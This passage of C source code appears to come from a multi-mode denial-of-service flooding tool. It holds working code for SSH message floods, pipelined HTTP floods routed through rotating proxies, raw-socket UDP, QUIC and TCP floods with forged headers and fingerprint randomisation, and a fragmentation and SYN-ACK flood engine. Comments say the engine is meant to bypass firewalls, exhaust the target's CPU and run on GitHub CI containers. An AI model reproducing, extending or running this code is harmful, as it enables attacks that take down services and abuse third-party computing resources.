            
            else if (args.is_v11_chaos) {
                if (now - conn->last_pulse_ms >= 5) {
                    int cork = 1;
                    setsockopt(conn->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                    unsigned char chaos_buf[4096];
                    for(int i=0; i<4096; i++) chaos_buf[i] = fast_rand() % 256;
                    send(conn->fd, chaos_buf, 1400, MSG_NOSIGNAL | MSG_MORE);
                    send(conn->fd, chaos_buf + 512, 1400, MSG_NOSIGNAL | MSG_MORE);
                    send(conn->fd, chaos_buf + 1024, 1200, MSG_OOB | MSG_NOSIGNAL);
                    cork = 0;
                    setsockopt(conn->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                    thread_stats[thread_id].packets += 3;
                    thread_stats[thread_id].bytes += 4000;
                    conn->last_pulse_ms = now;
                }
            }
            
            else if (args.is_v15_raw_amp || args.is_vn_tcp) {
                if (args.is_vn_tcp && conn->sub_stage == 0) {
                    // Step1: SSH banner
                    const char *ssh_banner = "SSH-2.0-OpenSSH_9.3p1 Ubuntu-1ubuntu3\r\n";
                    send(conn->fd, ssh_banner, strlen(ssh_banner), MSG_NOSIGNAL);
                    // Step2: minimal KEXINIT
                    unsigned char kexinit[256];
                    memset(kexinit, 0, sizeof(kexinit));
                    kexinit[0]=0x00;kexinit[1]=0x00;kexinit[2]=0x00;kexinit[3]=0xEC;
                    kexinit[4]=0x08;kexinit[5]=0x14;
                    for(int ki=6;ki<22;ki++) kexinit[ki]=(unsigned char)(fast_rand()&0xFF);
                    kexinit[22]=0x00;kexinit[23]=0x00;kexinit[24]=0x00;kexinit[25]=0x1F;
                    memcpy(kexinit+26,"curve25519-sha256,diffie-hellman-group14-sha256",31);
                    send(conn->fd, kexinit, sizeof(kexinit), MSG_NOSIGNAL);
                    conn->sub_stage = 1;
                    conn->last_pulse_ms = now;
                }
                int ret = 0;
                if (args.is_vn_tcp) {
                    // SSH_MSG_IGNORE flood (RFC 4253 s11.2) - server MUST accept, no RST
                    // Packet: [4B pkt_len][1B pad=6][1B type=2][4B str_len][32700B data][6B pad]
                    #define VN_PL 32700
                    #define VN_SZ (4+1+1+4+VN_PL+6)
                    static __thread unsigned char vn_pkt[VN_SZ];
                    static __thread int vn_ok = 0;
                    if (!vn_ok) {
                        uint32_t pl = 1+1+4+VN_PL+6;
                        vn_pkt[0]=(pl>>24)&0xFF;vn_pkt[1]=(pl>>16)&0xFF;
                        vn_pkt[2]=(pl>>8)&0xFF; vn_pkt[3]=pl&0xFF;
                        vn_pkt[4]=6; vn_pkt[5]=2;
                        vn_pkt[6]=(VN_PL>>24)&0xFF;vn_pkt[7]=(VN_PL>>16)&0xFF;
                        vn_pkt[8]=(VN_PL>>8)&0xFF; vn_pkt[9]=VN_PL&0xFF;
                        for(int pi=10;pi<VN_SZ;pi++) vn_pkt[pi]=(unsigned char)(fast_rand()&0xFF);
                        vn_ok=1;
                    }
                    *((unsigned int*)(vn_pkt+10))=fast_rand();
                    while(1) {
                        ret=send(conn->fd,vn_pkt,VN_SZ,MSG_NOSIGNAL);
                        if(ret<=0){if(errno==EAGAIN||errno==EWOULDBLOCK)conn->writable=0;break;}
                        thread_stats[thread_id].packets++;
                        thread_stats[thread_id].tcp_packets++;
                        thread_stats[thread_id].bytes+=ret;
                    }
                } else {
                    while(1) {
                        int s=32768+(fast_rand()%32768);
                        int offset=fast_rand()%(BUFFER_POOL_SIZE-s);
                        ret=send(conn->fd,global_buffer_pool+offset,s,MSG_NOSIGNAL);
                        if(ret<=0){if(errno==EAGAIN||errno==EWOULDBLOCK)conn->writable=0;break;}
                        thread_stats[thread_id].packets++;
                        thread_stats[thread_id].tcp_packets++;
                        thread_stats[thread_id].bytes+=ret;
                    }
                }
                if(ret<=0 && errno!=EAGAIN && errno!=EWOULDBLOCK) goto cleanup;
            }
            
            else if (args.is_v7_pipe) {
                if (now - conn->last_pulse_ms >= 50 + conn->jitter_ms) { 
                    
                    
                    char pipe_buffer[16384] = {0};
                    int bp = 0;
                    int req_count = 0;
                    
                    
                    for (int i = 0; i < 80; i++) {
                        
                        int len = snprintf(pipe_buffer + bp, 16384 - bp, 
                            "GET /?rand=%d HTTP/1.1\r\n%s", 
                            fast_rand() % 999999, conn->randomized_headers);
                        bp += len;
                        req_count++;
                        if (bp >= 15800) break; 
                    }
                    
                    if (conn->ssl) SSL_write(conn->ssl, pipe_buffer, bp);
                    else {
                        int cork = 1;
                        setsockopt(conn->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                        send(conn->fd, pipe_buffer, bp, MSG_NOSIGNAL);
                        cork = 0;
                        setsockopt(conn->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                    }
                    
                    thread_stats[thread_id].packets += req_count;
                    thread_stats[thread_id].bytes += bp;
                    conn->last_pulse_ms = now;
                }
            }
            
            else if (args.is_crash_mode) {
                 if (now - conn->last_pulse_ms >= 5) { 
                     int s = 64 + (rand() % 128); 
                     
                     send(conn->fd, global_buffer_pool + (rand() % (BUFFER_POOL_SIZE - s)), s, MSG_NOSIGNAL);
                     thread_stats[thread_id].packets++;
                     conn->last_pulse_ms = now;
                 }
            }
            
            else if (now - conn->last_pulse_ms >= PULSE_INTERVAL_MS + conn->jitter_ms) {
                if (args.is_half_open) {
                    send(conn->fd, "\0", 1, MSG_NOSIGNAL); 
                } else {
                    int s = 512 + (rand() % 1024);
                    send(conn->fd, global_buffer_pool + (rand() % (BUFFER_POOL_SIZE - s)), s, MSG_NOSIGNAL);
                    thread_stats[thread_id].packets++;
                }
                conn->last_pulse_ms = now;
            }
        }
    }
    return;

cleanup:
    if (conn) {
        int socket_error = 0;
        socklen_t len = sizeof(socket_error);
        if (getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &socket_error, &len) == 0 && socket_error != 0) {
            errno = socket_error;
        }
        // Silenced to avoid performance bottlenecks caused by log spam under high stress rates
    }
    thread_stats[thread_id].connect_fail++;
    if (conn) {
        if (conn->prev) {
            conn->prev->next = conn->next;
        } else {
            active_conns_list = conn->next;
        }
        if (conn->next) {
            conn->next->prev = conn->prev;
        }

        if (conn->proxy) {
            __sync_fetch_and_add(&conn->proxy->fail_count, 1);
            conn->proxy->last_fail_time = get_ms();
            if (conn->proxy->fail_count >= 15) {
                conn->proxy->is_dead = 1;
            }
            if (conn->proxy->active_conns > 0) {
                __sync_fetch_and_sub(&conn->proxy->active_conns, 1);
                __sync_fetch_and_sub(&global_proxy_active_conns, 1);
            }
        } else {
            if (global_active_conns > 0) __sync_fetch_and_sub(&global_active_conns, 1);
        }
        if (conn->ssl) {
            SSL_free(conn->ssl);
        }
        if (conn->fd > 0) {
            close(conn->fd);
        }
        if (conn->client_udp_fd > 0) {
            close(conn->client_udp_fd);
        }
        free(conn);
    }
}

static int get_total_active_conns() {
    return global_active_conns + global_proxy_active_conns;
}

static Proxy *select_alive_proxy() {
    if (proxy_count <= 0) return NULL;
    long long now = get_ms();
    for (int attempt = 0; attempt < 20; attempt++) {
        int idx = rand() % proxy_count;
        Proxy *p = &proxies[idx];
        if (p->is_dead) {
            if (now - p->last_fail_time > 10000) {
                p->is_dead = 0;
                p->fail_count = 0;
            } else {
                continue;
            }
        }
        if (p->active_conns >= MAX_CONNS_PER_PROXY) continue;
        return p;
    }
    for (int i = 0; i < proxy_count; i++) {
        if (proxies[i].active_conns < MAX_CONNS_PER_PROXY && !proxies[i].is_dead) {
            return &proxies[i];
        }
    }
    return NULL;
}

int spawn_connection(int epoll_fd, int thread_id) {
    if (get_total_active_conns() >= args.rate) {
        return 0;
    }
    int fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
    if (fd == -1) return 0;

    int val = 1;
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &val, sizeof(val));
    
    int syn_retries = 4;
    setsockopt(fd, IPPROTO_TCP, TCP_SYNCNT, &syn_retries, sizeof(syn_retries));
    
    int ttl = 55 + (fast_rand() % 10);
    setsockopt(fd, IPPROTO_IP, IP_TTL, &ttl, sizeof(ttl));
    int mss = 536 + (fast_rand() % 925);
    setsockopt(fd, IPPROTO_TCP, TCP_MAXSEG, &mss, sizeof(mss));
    
    if (args.is_v15_raw_amp || args.is_vn_tcp) {
        int sndbuf = args.is_vn_tcp ? 4194304 : 1048576;
        setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    }
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    Proxy *p = NULL;
    int is_udp = 0;
    if (args.is_vn_tcp) {
        // VN method: prefer proxy, fallback to direct connect
        p = select_alive_proxy();
        // p = NULL → will connect directly to target
    } else if (args.is_hybrid_v15 && proxy_count > 0) {
        p = select_alive_proxy();
        if ((fast_rand() % 100) < 40) {
            is_udp = 1;
        }
    } else if (!args.is_v15_raw_amp || (fast_rand() % 100 < 30)) {
        p = select_alive_proxy();
    }
    
    if (!p && proxy_count > 0 && (!args.is_v15_raw_amp) && (!args.is_hybrid_v15) && (!args.is_vn_tcp)) {
        close(fd);
        return 0;
    }
    
    if (!p) {
        if (__sync_fetch_and_add(&global_active_conns, 0) >= args.rate) {
            close(fd);
            return 0;
        }
    }
    
    int target_port = args.port;
    if (args.is_v3_killer && num_open_ports > 0) {
        target_port = open_ports[rand() % num_open_ports];
    }

    if (p) {
        addr.sin_port = htons(p->port);
        inet_pton(AF_INET, p->host, &addr.sin_addr);
        __sync_fetch_and_add(&p->active_conns, 1);
        __sync_fetch_and_add(&global_proxy_active_conns, 1);
    } else {
        addr.sin_port = htons(target_port);
        inet_pton(AF_INET, args.target_ip, &addr.sin_addr);
        __sync_fetch_and_add(&global_active_conns, 1);
    }

    Connection *conn = calloc(1, sizeof(Connection));
    if (!conn) {
        if (p) { __sync_fetch_and_sub(&p->active_conns, 1); __sync_fetch_and_sub(&global_proxy_active_conns, 1); }
        else __sync_fetch_and_sub(&global_active_conns, 1);
        close(fd);
        return 0;
    }
    conn->fd = fd; conn->thread_id = thread_id; conn->proxy = p;
    conn->target_port = target_port;
    conn->stage = STAGE_CONNECTING;
    conn->writable = 0;
    conn->last_pulse_ms = get_ms();
    conn->jitter_ms = (rand() % 15) - 7;
    conn->is_udp_assoc = is_udp;
    conn->client_udp_fd = -1;
    if (!args.is_v15_raw_amp && !args.is_hybrid_v15) {
        generate_random_headers(conn->randomized_headers, conn->randomized_ua, args.host);
    }

    if (args.is_v14_phantom && !p) {
        unsigned char fastopen_data[] = "GET / HTTP/1.1\r\n\r\n";
        sendto(fd, fastopen_data, strlen((char*)fastopen_data), MSG_FASTOPEN, (struct sockaddr *)&addr, sizeof(addr));
    } else {
        int ret = connect(fd, (struct sockaddr *)&addr, sizeof(addr));
        if (ret < 0 && errno != EINPROGRESS) {
            LOG_ERR("DEBUG connect() failed: fd=%d errno=%d (%s) target=%s:%d", fd, errno, strerror(errno), args.target_ip, target_port);
            close(fd);
            if (conn->proxy && conn->proxy->active_conns > 0) { __sync_fetch_and_sub(&conn->proxy->active_conns, 1); __sync_fetch_and_sub(&global_proxy_active_conns, 1); }
            if (!conn->proxy) __sync_fetch_and_sub(&global_active_conns, 1);
            free(conn);
            return 0;
        }
    }

    struct epoll_event ev = {EPOLLOUT | EPOLLIN | EPOLLET, {.ptr = conn}};
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, fd, &ev) < 0) {
        LOG_ERR("DEBUG epoll_ctl ADD failed: fd=%d errno=%d (%s)", fd, errno, strerror(errno));
        close(fd);
        if (conn->proxy && conn->proxy->active_conns > 0) { __sync_fetch_and_sub(&conn->proxy->active_conns, 1); __sync_fetch_and_sub(&global_proxy_active_conns, 1); }
        if (!conn->proxy) __sync_fetch_and_sub(&global_active_conns, 1);
        free(conn);
        return 0;
    }

    conn->next = active_conns_list;
    if (active_conns_list) {
        active_conns_list->prev = conn;
    }
    active_conns_list = conn;
    return 1;
}

void *worker_thread(void *arg) {
    int tid = *(int *)arg; free(arg);
    
    unsigned int bin_target_ip = 0;
    inet_pton(AF_INET, args.target_ip, &bin_target_ip);
    unsigned short bin_target_port = htons(args.port);
    
    xorshift_init((unsigned int)(tid + 1) * 2654435761u + (unsigned int)time(NULL));
    

    if (args.is_v16_dns_amp || args.is_v18_quic) {
        int raw_fd = init_raw_socket();
        int udp_raw_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        LOG_INFO("T%d: stateless path entered, raw_fd=%d, udp_fd=%d, v18tls=%d", tid, raw_fd, udp_raw_fd, args.is_v18_tls);
        fflush(stdout); fflush(stderr);
        
        if (raw_fd >= 0) {
            int sndbuf = 64 * 1024 * 1024;
            setsockopt(raw_fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        }
        if (udp_raw_fd >= 0) {
            int sndbuf = 64 * 1024 * 1024;
            setsockopt(udp_raw_fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        }
        
        unsigned int cached_my_ip = get_local_ip();
        unsigned int cached_d_ip = bin_target_ip;
        struct sockaddr_in target_addr;
        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(args.port);
        target_addr.sin_addr.s_addr = cached_d_ip;
        
        long long start_ms = get_ms();
        
        while (1) {
            if (args.is_v16_dns_amp) {
                #define V16_BATCH 64
                static __thread unsigned char raw_pkts_v16[V16_BATCH][1500] __attribute__((aligned(32)));
                static __thread struct mmsghdr msgs_v16[V16_BATCH];
                static __thread struct iovec iovs_v16[V16_BATCH];
                static __thread int mmsg_v16_inited = 0;
                static __thread unsigned int v16_udp_base_sum = 0;
                static __thread int v16_pkt_len = 0;
                
                if (!mmsg_v16_inited) {
                    int udp_payload_len = 1500 - sizeof(struct iphdr) - sizeof(struct udphdr);
                    v16_pkt_len = sizeof(struct iphdr) + sizeof(struct udphdr) + udp_payload_len;
                    
                    unsigned char v16_tpl[1500] __attribute__((aligned(32)));
                    unsigned char udp_pay[1500];
                    for (int k = 0; k < udp_payload_len; k += 8) {
                        *((unsigned long long*)(udp_pay + k)) = 0xAAAAAAAAAAAAAAAAULL ^ (fast_rand() * 0x0101010101010101ULL);
                    }
                    int out_len = 0;
                    craft_udp_packet(v16_tpl, &out_len, cached_my_ip, cached_d_ip, 12345, args.port, udp_pay, udp_payload_len);
                    
                    struct iphdr *tiph = (struct iphdr *)v16_tpl;
                    struct udphdr *tudph = (struct udphdr *)(v16_tpl + sizeof(struct iphdr));
                    unsigned char *tpdata = v16_tpl + sizeof(struct iphdr) + sizeof(struct udphdr);
                    tudph->source = 0; tudph->check = 0;
                    
                    v16_udp_base_sum = 0;
                    v16_udp_base_sum += (tiph->saddr & 0xFFFF) + (tiph->saddr >> 16);
                    v16_udp_base_sum += (tiph->daddr & 0xFFFF) + (tiph->daddr >> 16);
                    v16_udp_base_sum += htons(IPPROTO_UDP);
                    v16_udp_base_sum += tudph->len;
                    v16_udp_base_sum += tudph->dest;
                    unsigned short *tps = (unsigned short *)tpdata;
                    for (int k = 0; k < udp_payload_len / 2; k++) v16_udp_base_sum += tps[k];
                    if (udp_payload_len % 2) v16_udp_base_sum += htons(((unsigned short)tpdata[udp_payload_len - 1]) << 8);
                    
                    for (int b = 0; b < V16_BATCH; b++) {
                        memcpy(raw_pkts_v16[b], v16_tpl, v16_pkt_len);
                        iovs_v16[b].iov_len = v16_pkt_len;
                        iovs_v16[b].iov_base = raw_pkts_v16[b];
                        msgs_v16[b].msg_hdr.msg_iov = &iovs_v16[b];
                        msgs_v16[b].msg_hdr.msg_iovlen = 1;
                        msgs_v16[b].msg_hdr.msg_name = &target_addr;
                        msgs_v16[b].msg_hdr.msg_namelen = sizeof(target_addr);
                    }
                    mmsg_v16_inited = 1;
                }
                
                for (int b = 0; b < V16_BATCH; b++) {
                    struct udphdr *udph = (struct udphdr *)(raw_pkts_v16[b] + sizeof(struct iphdr));
                    unsigned short sp = htons(1024 + (fast_rand() % 60000));
                    udph->source = sp;
                    unsigned int cs = v16_udp_base_sum + sp;
                    cs = (cs & 0xFFFF) + (cs >> 16); cs = (cs & 0xFFFF) + (cs >> 16);
                    udph->check = (unsigned short)~cs;
                    if (udph->check == 0) udph->check = 0xFFFF;
                }
                
                int sent_count = sendmmsg(raw_fd, msgs_v16, V16_BATCH, MSG_NOSIGNAL);
                if (sent_count > 0) {
                    for (int b = 0; b < sent_count; b++) {
                        thread_stats[tid].packets++;
                        thread_stats[tid].bytes += msgs_v16[b].msg_len;
                    }
                }
            } 
            else if (args.is_v18_quic) {
                #define V18Q_BATCH 64
                static __thread unsigned char quic_pkts[V18Q_BATCH][1500] __attribute__((aligned(32)));
                static __thread struct mmsghdr msgs_quic[V18Q_BATCH];
                static __thread struct iovec iovs_quic[V18Q_BATCH];
                static __thread int quic_inited = 0;
                static __thread int quic_pkt_len = 0;
                static __thread unsigned int quic_base_sum = 0;
                
                if (!quic_inited) {
                    int udp_payload_len = 1200; // QUIC typical initial packet size
                    quic_pkt_len = sizeof(struct iphdr) + sizeof(struct udphdr) + udp_payload_len;
                    unsigned char qtpl[1500] __attribute__((aligned(32)));
                    unsigned char qpay[1500];
                    for(int i=0; i<udp_payload_len; i++) qpay[i] = fast_rand() & 0xFF;
                    qpay[0] = 0xC3; // QUIC Initial Header
                    *((unsigned int*)(qpay+1)) = htonl(0x00000001); // Version 1
                    qpay[5] = 0x08; // DCID Length
                    
                    int out_len = 0;
                    craft_udp_packet(qtpl, &out_len, cached_my_ip, cached_d_ip, 12345, args.port, qpay, udp_payload_len);
                    
                    struct iphdr *tiph = (struct iphdr *)qtpl;
                    struct udphdr *tudph = (struct udphdr *)(qtpl + sizeof(struct iphdr));
                    unsigned char *tpdata = qtpl + sizeof(struct iphdr) + sizeof(struct udphdr);
                    tudph->source = 0; tudph->check = 0;
                    
                    quic_base_sum = 0;
                    quic_base_sum += (tiph->saddr & 0xFFFF) + (tiph->saddr >> 16);
                    quic_base_sum += (tiph->daddr & 0xFFFF) + (tiph->daddr >> 16);
                    quic_base_sum += htons(IPPROTO_UDP);
                    quic_base_sum += tudph->len;
                    quic_base_sum += tudph->dest;
                    unsigned short *tps = (unsigned short *)tpdata;
                    for (int k = 0; k < udp_payload_len / 2; k++) quic_base_sum += tps[k];
                    if (udp_payload_len % 2) quic_base_sum += htons(((unsigned short)tpdata[udp_payload_len - 1]) << 8);
                    
                    for (int b = 0; b < V18Q_BATCH; b++) {
                        memcpy(quic_pkts[b], qtpl, quic_pkt_len);
                        iovs_quic[b].iov_len = quic_pkt_len;
                        iovs_quic[b].iov_base = quic_pkts[b];
                        msgs_quic[b].msg_hdr.msg_iov = &iovs_quic[b];
                        msgs_quic[b].msg_hdr.msg_iovlen = 1;
                        msgs_quic[b].msg_hdr.msg_name = &target_addr;
                        msgs_quic[b].msg_hdr.msg_namelen = sizeof(target_addr);
                    }
                    quic_inited = 1;
                }
                
                for (int b = 0; b < V18Q_BATCH; b++) {
                    struct udphdr *udph = (struct udphdr *)(quic_pkts[b] + sizeof(struct iphdr));
                    unsigned short sp = htons(1024 + (fast_rand() % 60000));
                    udph->source = sp;
                    // Randomize DCID
                    unsigned char *qdata = quic_pkts[b] + sizeof(struct iphdr) + sizeof(struct udphdr);
                    *((unsigned long long*)(qdata+6)) = fast_rand() * 0x0101010101010101ULL;
                    
                    unsigned int cs = quic_base_sum + sp;
                    cs = (cs & 0xFFFF) + (cs >> 16); cs = (cs & 0xFFFF) + (cs >> 16);
                    udph->check = (unsigned short)~cs;
                    if (udph->check == 0) udph->check = 0xFFFF;
                }
                
                int sent_count = sendmmsg(raw_fd, msgs_quic, V18Q_BATCH, MSG_NOSIGNAL);
                if (sent_count > 0) {
                    for (int b = 0; b < sent_count; b++) {
                        thread_stats[tid].packets++;
                        thread_stats[tid].bytes += msgs_quic[b].msg_len;
                    }
                }
            }
            else if (args.is_v18_tls) {
                #undef V18T_BATCH
                #define V18T_BATCH 256
                static __thread unsigned char tls_pkts[V18T_BATCH][1500] __attribute__((aligned(32)));
                static __thread struct mmsghdr msgs_tls[V18T_BATCH];
                static __thread struct iovec iovs_tls[V18T_BATCH];
                static __thread int tls_inited = 0;
                static __thread int tls_pkt_len = 0;
                static __thread unsigned int tls_base_sum = 0;
                static __thread unsigned int ip_base_sum = 0;
                
                if (!tls_inited) {
                    int tls_payload_len = 1460;
                    tls_pkt_len = sizeof(struct iphdr) + 20 + tls_payload_len;
                    unsigned char ttpl[1500] __attribute__((aligned(32)));
                    memset(ttpl, 0, sizeof(struct iphdr) + 20);
                    
                    // Build IP header
                    struct iphdr *tiph = (struct iphdr *)ttpl;
                    tiph->ihl = 5; tiph->version = 4;
                    tiph->tot_len = htons(tls_pkt_len);
                    tiph->frag_off = htons(0x4000);
                    tiph->ttl = 64;
                    tiph->protocol = IPPROTO_TCP;
                    tiph->saddr = cached_my_ip;
                    tiph->daddr = cached_d_ip;
                    
                    // Build TCP header — doff=5, PSH+ACK
                    struct tcphdr *ttcph = (struct tcphdr *)(ttpl + sizeof(struct iphdr));
                    ttcph->doff = 5;
                    ttcph->psh = 1; ttcph->ack = 1;
                    ttcph->dest = htons(args.port);
                    ttcph->window = htons(65535);
                    
                    // Build pure random payload (no TLS signature)
                    unsigned char *tpay = ttpl + sizeof(struct iphdr) + 20;
                    for(int i=0; i<tls_payload_len; i++) tpay[i] = fast_rand() & 0xFF;
                    
                    // Precompute IP checksum base (excluding id, ttl, check)
                    // IP header words: [0]=ver/ihl/tos, [1]=tot_len, [2]=id, [3]=frag, [4]=ttl/proto
                    //                  [5]=check, [6-7]=saddr, [8-9]=daddr
                    tiph->id = 0; tiph->ttl = 0; tiph->check = 0;
                    unsigned short *ipw = (unsigned short *)tiph;
                    ip_base_sum = ipw[0] + ipw[1] + ipw[3] + ipw[6] + ipw[7] + ipw[8] + ipw[9];
                    // Add protocol field (ttl=0, proto=TCP → htons(0x0006) but split across word[4])
                    ip_base_sum += htons(IPPROTO_TCP);  // word[4] with ttl=0
                    tiph->ttl = 64; // restore for template
                    
                    // TCP pseudo-header checksum base (excluding source, seq, ack_seq, check)
                    ttcph->source = 0; ttcph->seq = 0; ttcph->ack_seq = 0; ttcph->check = 0;
                    tls_base_sum = 0;
                    tls_base_sum += (tiph->saddr & 0xFFFF) + (tiph->saddr >> 16);
                    tls_base_sum += (tiph->daddr & 0xFFFF) + (tiph->daddr >> 16);
                    tls_base_sum += htons(IPPROTO_TCP);
                    tls_base_sum += htons(20 + tls_payload_len);
                    unsigned short *tps = (unsigned short *)(ttpl + sizeof(struct iphdr));
                    for (int k = 0; k < (20 + tls_payload_len) / 2; k++) tls_base_sum += tps[k];
                    
                    for (int b = 0; b < V18T_BATCH; b++) {
                        memcpy(tls_pkts[b], ttpl, tls_pkt_len);
                        iovs_tls[b].iov_len = tls_pkt_len;
                        iovs_tls[b].iov_base = tls_pkts[b];
                        msgs_tls[b].msg_hdr.msg_iov = &iovs_tls[b];
                        msgs_tls[b].msg_hdr.msg_iovlen = 1;
                        msgs_tls[b].msg_hdr.msg_name = &target_addr;
                        msgs_tls[b].msg_hdr.msg_namelen = sizeof(target_addr);
                    }
                    tls_inited = 1;
                    LOG_INFO("T%d: V18 TLS init OK, pkt_len=%d, raw_fd=%d", tid, tls_pkt_len, raw_fd);
                    fflush(stderr);
                }
                
                for (int b = 0; b < V18T_BATCH; b++) {
                    struct iphdr *iph = (struct iphdr *)tls_pkts[b];
                    struct tcphdr *tcph = (struct tcphdr *)(tls_pkts[b] + sizeof(struct iphdr));
                    
                    // Per-packet mutation: source port, seq, ack, IP ID
                    unsigned short sp = htons(1024 + (fast_rand() % 60000));
                    unsigned int seq = fast_rand();
                    unsigned int ack = fast_rand();
                    unsigned short new_id = htons(fast_rand() & 0xFFFF);
                    unsigned short ttl_val = 55 + (fast_rand() % 10);
                    
                    tcph->source = sp;
                    tcph->seq = htonl(seq);
                    tcph->ack_seq = htonl(ack);
                    iph->id = new_id;
                    iph->ttl = ttl_val;
                    
                    // Fast IP checksum: base + id + ttl_proto
                    unsigned int ic = ip_base_sum + new_id + htons((ttl_val << 8) | IPPROTO_TCP);
                    ic = (ic >> 16) + (ic & 0xFFFF); ic += (ic >> 16);
                    iph->check = (unsigned short)~ic;
                    
                    // Fast TCP checksum: base + source + seq + ack
                    unsigned int cs = tls_base_sum + sp;
                    cs += htons(seq >> 16); cs += htons(seq & 0xFFFF);
                    cs += htons(ack >> 16); cs += htons(ack & 0xFFFF);
                    cs = (cs >> 16) + (cs & 0xFFFF); cs += (cs >> 16);
                    tcph->check = (unsigned short)~cs;
                }
                
                int sent_count = sendmmsg(raw_fd, msgs_tls, V18T_BATCH, MSG_NOSIGNAL);
                if (sent_count > 0) {
                    for (int b = 0; b < sent_count; b++) {
                        thread_stats[tid].packets++;
                        thread_stats[tid].bytes += tls_pkt_len;
                    }
                } else if (sent_count < 0) {
                    if (errno == ENOBUFS || errno == EAGAIN) {
                        usleep(100);
                    }
                }
            }
        }
    }
    // ======================================================================
    // FRAGMENTATION FLOOD + SYN-ACK FLOOD ENGINE
    // Replaces v17_tcp_bypass — optimized for GitHub CI container environment
    // frag_flood: IP fragments with overlapping/non-sequential offsets → FW bypass
    // synack_flood: perfect SYN-ACK packets → CPU exhaustion on target
    // ======================================================================
    if (args.is_frag_flood || args.is_synack_flood) {
        int nc=sysconf(_SC_NPROCESSORS_ONLN);
        cpu_set_t cset; CPU_ZERO(&cset);
        CPU_SET(tid%nc,&cset);
        pthread_setaffinity_np(pthread_self(),sizeof(cpu_set_t),&cset);

        unsigned int src_ip=get_local_ip();
        if(!src_ip){LOG_ERR("T%d: no IP",tid);return NULL;}

        char iface[32]={0};
        get_default_interface(iface,sizeof(iface));
        if(!iface[0]){LOG_ERR("T%d: no iface",tid);return NULL;}
        int ifindex=if_nametoindex(iface);

        unsigned char src_mac[6]={0};
        {char path[128];snprintf(path,sizeof(path),"/sys/class/net/%s/address",iface);
         FILE *f=fopen(path,"r");if(f){int m[6];
           if(fscanf(f,"%x:%x:%x:%x:%x:%x",&m[0],&m[1],&m[2],&m[3],&m[4],&m[5])==6)
             for(int i=0;i<6;i++) src_mac[i]=m[i];
           fclose(f);}}

        unsigned char gw_mac[6]={0};
        {unsigned int gw_ip=0;
         FILE *frt=fopen("/proc/net/route","r");
         if(frt){char ln[256];
           while(fgets(ln,sizeof(ln),frt)){char ri[32];unsigned long rd,rg;
             if(sscanf(ln,"%31s %lx %lx",ri,&rd,&rg)==3&&rd==0&&rg!=0){
               gw_ip=(unsigned int)rg;break;}}
           fclose(frt);}
         if(gw_ip){struct in_addr ga;ga.s_addr=gw_ip;
           char cmd[128];snprintf(cmd,sizeof(cmd),"ping -c1 -W1 %s>/dev/null 2>&1",inet_ntoa(ga));
           if(system(cmd)){} usleep(50000);
           FILE *fa=fopen("/proc/net/arp","r");
           if(fa){char ln[256];if(fgets(ln,sizeof(ln),fa)){}
             while(fgets(ln,sizeof(ln),fa)){char ai[64],am[64];int t,fl;
               if(sscanf(ln,"%63s 0x%x 0x%x %17s",ai,&t,&fl,am)>=4&&
                  inet_addr(ai)==gw_ip){
                 int m[6];if(sscanf(am,"%x:%x:%x:%x:%x:%x",
                                    &m[0],&m[1],&m[2],&m[3],&m[4],&m[5])==6)
                   for(int i=0;i<6;i++) gw_mac[i]=m[i];
                 break;}}
             fclose(fa);}}}

        // Auto-detect: AF_PACKET (full VM) vs AF_INET SOCK_RAW (container/CI)
        int _probe = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
        int use_afp = (_probe >= 0);
        if (_probe >= 0) close(_probe);
        if (!use_afp) LOG_INFO("T%d: container mode -> AF_INET SOCK_RAW", tid);

        int fd_send, fd_send2;
        if(use_afp){
            fd_send=socket(AF_PACKET,SOCK_RAW,htons(ETH_P_IP));
            struct sockaddr_ll sl={0};
            sl.sll_family=AF_PACKET;sl.sll_ifindex=ifindex;sl.sll_protocol=htons(ETH_P_IP);
            bind(fd_send,(struct sockaddr*)&sl,sizeof(sl));
            int q=1;setsockopt(fd_send,SOL_PACKET,PACKET_QDISC_BYPASS,&q,sizeof(q));
            fd_send2=socket(AF_PACKET,SOCK_RAW,htons(ETH_P_IP));
            bind(fd_send2,(struct sockaddr*)&sl,sizeof(sl));
            setsockopt(fd_send2,SOL_PACKET,PACKET_QDISC_BYPASS,&q,sizeof(q));
        } else {
            fd_send=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
            int h=1;setsockopt(fd_send,IPPROTO_IP,IP_HDRINCL,&h,sizeof(h));
            fd_send2=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
            setsockopt(fd_send2,IPPROTO_IP,IP_HDRINCL,&h,sizeof(h));
        }
        {int sb=64*1024*1024;
         setsockopt(fd_send,SOL_SOCKET,SO_SNDBUF,&sb,sizeof(sb));
         setsockopt(fd_send2,SOL_SOCKET,SO_SNDBUF,&sb,sizeof(sb));
        }

        struct sockaddr_ll nf_sll={0};
        nf_sll.sll_family=AF_PACKET;nf_sll.sll_ifindex=ifindex;
        nf_sll.sll_halen=6;memcpy(nf_sll.sll_addr,gw_mac,6);
        nf_sll.sll_protocol=htons(ETH_P_IP);

        struct sockaddr_in nf_raw={0};
        nf_raw.sin_family=AF_INET;
        nf_raw.sin_addr.s_addr=bin_target_ip;

        // OS fingerprint tables
        static const unsigned char nf_ttl[]={
            64,64,64,63,128,128,64,117,255,63,64,128,64,60,
            64,128,64,64,117,64,64,128,64,63,255,64,60,128,
            64,63,128,255,64,64,128,64};
        int nf_ttl_n=sizeof(nf_ttl);
        static const unsigned short nf_win[]={
            8192,16384,32768,65535,29200,14600,43690,
            26880,8760,32120,16060,26280,65535,4096,
            28960,14480,5840,5792,65520,64240,32767};
